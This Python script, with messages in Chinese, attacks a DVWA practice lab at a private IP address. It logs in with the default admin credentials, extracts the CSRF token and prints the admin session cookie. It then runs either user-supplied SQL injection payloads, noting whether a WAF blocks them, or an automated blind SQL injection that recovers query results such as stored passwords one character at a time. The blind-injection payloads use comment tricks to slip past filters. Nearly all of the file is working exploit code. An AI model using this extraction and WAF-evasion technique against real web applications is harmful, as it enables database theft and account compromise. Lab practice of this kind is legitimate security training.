import requests
import re
import sys
from requests.exceptions import ConnectionError, Timeout, RequestException

BASE_URL = "http://192.168.200.180/"
LOGIN_URL = f"{BASE_URL}/login.php"
SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"
BLIND_SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli_blind/"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Connection": "close",
    "DNT": "1",
    "Upgrade-Insecure-Requests": "1"
}

session = requests.Session()

def login():
    try:
        response = session.get(LOGIN_URL, headers=HEADERS, timeout=10)
        token_match = re.search(r'name="user_token" value="([a-z0-9]{32})"', response.text)

        if not token_match:
            print("[!] CSRF token 無法取得.")
            sys.exit(1)

        token = token_match.group(1)
        print(f"[*] 取得 CSRF token: {token}")

        payload = {"username": "admin", "password": "password", "Login": "Login", "user_token": token}
        login_response = session.post(LOGIN_URL, data=payload, headers=HEADERS, timeout=10)

        if "Welcome" in login_response.text:
            print("[*] 登入成功!")
            print(f"[*] Admin cookie: {session.cookies.get('PHPSESSID')}")
        else:
            print("[!] 登入失敗.")
            sys.exit(1)

    except (ConnectionError, Timeout) as e:
        print(f"[!] 登入請求失敗: {e}")
        sys.exit(1)

def test_sqli(payload):
    """一般 SQL Injection 測試"""
    print(f"[*] 測試 Payload: {payload}")
    data = {"id": payload, "Submit": "Submit"}

    try:
        response = session.post(SQLI_URL, data=data, headers=HEADERS, timeout=10)

        print(f"[+] 狀態碼: {response.status_code}")
        print(f"[+] 回應: {response.text[:200]}...\n")

        if "User ID exists in the database" in response.text:
            print(f"[!] Payload 成功: {payload}")
        elif "403 Forbidden" in response.text:
            print(f"[*] Payload 被 WAF 阻擋: {payload}")
        else:
            print("[?] 不明回應，檢查 WAF 日誌.")

    except (ConnectionError, Timeout) as e:
        print(f"[!] 請求失敗: {e}")
    except RequestException as e:
        print(f"[!] 發生未知錯誤: {e}")

def blind_sqli(query):
    """Blind SQL Injection 攻擊"""
    extracted_data = ""
    print(f"[*] 開始提取資料: {query}")

    try:
        for index in range(1, 33): 
            for i in range(32, 126): 
                payload = f"7'/**/or/**/(SELECT/**/ascii(substring(({query}),{index},1)))={i}/**/%23"
                url = f"{BLIND_SQLI_URL}?id={payload}&Submit=Submit#"
                response = session.get(url, headers=HEADERS, timeout=10)

                if "User ID exists" in response.text:
                    extracted_data += chr(i)
                    sys.stdout.write(chr(i))
                    sys.stdout.flush()
                    break

        print(f"\n[+] 提取結果: {extracted_data}")
    except (ConnectionError, Timeout) as e:
        print(f"[!] 請求失敗: {e}")
    except RequestException as e:
        print(f"[!] 發生未知錯誤: {e}")

def main():
    login()
    mode = input("請選擇攻擊模式 (1: SQL Injection, 2: Blind SQL Injection): ")

    if mode == "1":
        payload = input("請輸入 SQL Injection Payload: ")
        test_sqli(payload)
    elif mode == "2":
        query = input("請輸入 SQL 查詢 (例: select password from users where user_id=1): ")
        blind_sqli(query)
    else:
        print("[!] 無效的選擇，請重新執行程式.")

if __name__ == "__main__":
    main()
